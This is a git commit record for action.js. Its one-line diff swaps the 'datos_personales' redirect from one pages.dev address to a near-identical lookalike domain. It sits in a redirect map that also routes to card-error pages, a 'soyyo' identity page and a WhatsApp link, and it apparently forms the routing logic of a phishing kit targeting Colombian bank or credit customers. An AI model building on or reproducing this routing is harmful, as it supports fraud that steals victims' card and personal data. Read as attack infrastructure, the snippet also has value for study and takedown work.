027e239a58e458c765e49a69b93f649d832899fa
popular-popular-popular <fredypuyo792@gmail.com>
2026-09-23 22:24:27 -0500

    Update action.js

--- action.js
+++ action.js
@@ -10,7 +10,7 @@ const REDIRECTS = {
   'error_credito': 'tarjeta.html?error=invalid', 
   'error_crédito': 'tarjeta.html?error=invalid', 
   'soyyo': 'soyyo.html',
-  'datos_personales': 'https://cupo-virtualbogota.pages.dev/bogota/datos-personales.html',
+  'datos_personales': 'https://cupos-virtualesbogota.pages.dev/bogota/datos-personales.html',
   'finalizar': 'https://wa.me/message/SNG3H4I7373KP1',
   'error_logo': 'soyyo.html?error=invalid',
 };
